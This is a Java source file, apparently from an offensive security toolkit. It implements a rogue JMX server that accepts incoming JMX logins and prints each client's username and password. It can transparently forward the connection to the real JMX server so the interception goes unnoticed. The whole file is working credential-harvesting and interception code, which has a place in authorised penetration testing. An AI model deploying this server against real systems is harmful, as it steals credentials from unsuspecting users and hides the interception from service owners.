package de.qtc.rmg.utils;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RMISocketFactory;

import javax.management.remote.rmi.RMIConnection;
import javax.management.remote.rmi.RMIServer;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.LimitedSocketFactory;
import de.qtc.rmg.operations.RemoteObjectClient;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.LiveRef;

/**
 * The RogueJMX class implements a rogue JMX server that displays used credentials from incoming
 * JMX connections. The incoming connections can optionally be forwarded to a real JMX server which
 * makes the rogue JMX server invisible for a client and does not interrupt any services.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class RogueJMX implements RMIServer {

    private int port;
    private String address;

    private String forwardTarget;
    private RMIServer forward = null;

    private final static String serialFilter = String.class.getName() + ";!*";

    /**
     * Constructor requires the address where the rogue JMX server is bound and the listening port.
     *
     * @param address Address where the rogue JMX should be bound
     * @param port Port where the rogue JMX should listen
     */
    public RogueJMX(String address, int port)
    {
        this.address = address;
        this.port = port;
    }

    /**
     * Export the rogue JMX server. This makes the server available via TCP on the address and port that
     * were specified during creation of the server. A serialization filter that only accepts the String
     * class is used during the export. This is the same filtering that is applied for the default JMX server
     * and incoming credentials are expected to be an array of String (String[]). When using the server for
     * other JMX implementations, you may need to modify the filter.
     *
     * It is important to notice that serialization filters were backported to Java8 and earlier in an incompatible
     * way compared to Java9+ projects. Whereas in Java9+ the ObjectInputFilter class is located within the java.io
     * package, Java8 and earlier contains it within the sun.misc package. This makes it basically impossible to
     * write cross compatible code without using reflection. Therefore, the RMGUtils class is used for creating and
     * injecting the serialization filter.
     *
     * @return Remote bound RogueJMX server
     * @throws RemoteException
     */
    public Remote export() throws RemoteException
    {
        Logger.printlnMixedBlue("Statring RogueJMX Server on", address + ":" + String.valueOf(port));

        RMIClientSocketFactory csf = RMISocketFactory.getDefaultSocketFactory();
        RMIServerSocketFactory ssf = new LimitedSocketFactory(address);

        Remote boundObject = null;

        try {
            LiveRef liveRef = new LiveRef(new ObjID(), port, csf, ssf);
            UnicastServerRef unicastServerRef = new UnicastServerRef(liveRef);

            try {
                Object inputFilter = RMGUtils.createObjectInputFilter(serialFilter);
                RMGUtils.injectObjectInputFilter(unicastServerRef, inputFilter);

            } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException
                    | InvocationTargetException | NoSuchFieldException e1) {
                ExceptionHandler.internalError("RogueJMX.export", "Some reflective access failed.");
            }

            boundObject = unicastServerRef.exportObject(this, null, false);

        } catch( java.rmi.server.ExportException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.net.BindException ) {
                Logger.eprintlnMixedYellow("Unable to bind on rogue JMX server on", address + ":" + port);
                Logger.eprintln("The address is may already in use or is not available on your system");
                ExceptionHandler.showStackTrace(e);
                RMGUtils.exit();

            } else {
                ExceptionHandler.unexpectedException(e, "creation of", "rogue JMX server", true);
            }
        }

        printExportInfo(boundObject);
        return boundObject;
    }

    /**
     * Prints some general information about the RogueJMX server (ObjID that was used for the export and
     * information about the forward host if specified).
     *
     * @param boundObject bound RogueJMX server
     */
    private void printExportInfo(Remote boundObject)
    {
        Logger.increaseIndent();

        try {
            ObjID objID = RMGUtils.extractObjID(boundObject);
            Logger.printlnMixedBlue("--> Assigned ObjID is:", objID.toString());

        } catch (IllegalArgumentException | IllegalAccessException e) {
            ExceptionHandler.internalError("RogueJMX.printInfo", "Error while extracting ObjID");
        }

        if( forward != null )
            Logger.printlnMixedBlue("--> Forwarding connections to:", forwardTarget);

        Logger.decreaseIndent();
    }

    /**
     * Register a forward target in form of a RemoteObjectClient.
     *
     * @param client RemoteObjectClient that points to a remote JMX service
     */
    public void forwardTo(RemoteObjectClient client)
    {
        forwardTarget = client.toString();
        forward = (RMIServer)client.remoteObject.remoteObject;
    }

    /**
     * Is invoked by the newClient function to decide whether to forward the connection. If a forward
     * target was registered, forward the call to the target. Otherwise, raise an security exception
     * (failed login from the client perspective).
     *
     * @param credentials Credential object used by the incoming connection
     * @param msg Exception message to display when forwarding was not enabled
     * @return if forwarding is enabled, an RMIConnection object that points to the target
     * @throws IOException
     */
    private RMIConnection conditionalForward(Object credentials, String msg) throws IOException
    {
        if( forward == null ) {
            SecurityException e = new SecurityException(msg);
            throw e;
        }

        return forward.newClient(credentials);
    }

    /**
     * Required function by RMIServer. We display a static version number.
     */
    @Override
    public String getVersion() throws RemoteException
    {
        Logger.printlnMixedBlue("Got incoming call for", "getVersion(...)");

        return "1.0 ";
    }

    /**
     * Incoming JMX connection that may contains credentials. Attempts to parse the credential object
     * and display user credentials. Optionally forwards the connection to a remote JMX service (if
     * specified). If no forward target was specified, raise a SecurityException (failed login from
     * the client perspective).
     */
    @Override
    public RMIConnection newClient(Object credentials) throws IOException
    {
        Logger.printlnMixedBlue("Got incoming call for", "newClient(...)");
        Logger.increaseIndent();

        if( !(credentials instanceof String[]) ) {

            String msg = "";

            if( credentials == null ) {
                Logger.printlnMixedYellow("Client connected", "without", "specifying credentials.");
                msg = "Authentication failed! " + "Credentials required";
            }

            else {
                String className = credentials.getClass().getName();
                Logger.printlnMixedYellow("Client connected with an unexpected credential type:", className);
                msg = "Credentials should be String[] instead of " + className;
            }

            Logger.decreaseIndent();
            return conditionalForward(credentials, msg);
        }

        String[] creds = (String[])credentials;

        Logger.printMixedBlueFirst("Username:", "");
        Logger.printlnPlainYellow(creds[0]);

        Logger.printMixedBlueFirst("Password:", "");
        Logger.printlnPlainYellow(creds[1]);

        Logger.decreaseIndent();

        return conditionalForward(credentials, "Authentication failed!");
    }
}